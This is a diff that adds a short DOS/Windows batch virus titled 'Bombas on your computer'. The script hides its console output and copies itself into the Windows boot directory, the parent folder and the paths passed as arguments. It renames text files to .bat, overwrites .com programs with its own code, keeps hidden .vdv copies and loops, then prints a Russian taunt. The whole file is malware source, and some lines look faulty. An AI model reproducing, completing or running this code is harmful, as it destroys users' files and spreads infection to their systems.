@@ -1,0 +1,28 @@
+:Bombas on your computer 99(3)
+@echo off
+:rep
+set boom = *.com
+set wibe = goto
+ctty nul
+copy %0 %winbootdir%\%0
+copy %0 ..
+copy %0 %1 %2 %3 %4 %5
+ren *.txt *.bat
+if not exist %boom% %wibe% fun
+for %%i in (%boom% ..\%boom%) do copy %%i *.vdv
+:qw
+%wibe% awsd
+:awsd
+for %%k in (%boom% ..\%boom%) do copy %0 %%k
+for %%l in (%boom% ..\%boom%) do find "%boom%" %%i
+if not errorlevel 1 %wibe% fun
+ren *.com *.bat
+attrib *.vdv + h
+attrib %0 -h
+%wibe% rep
+:fun
+echo НЕ догонишь, НЕ поймаешь, НЕ догнал, НЕ воровали!
+
+
+
+
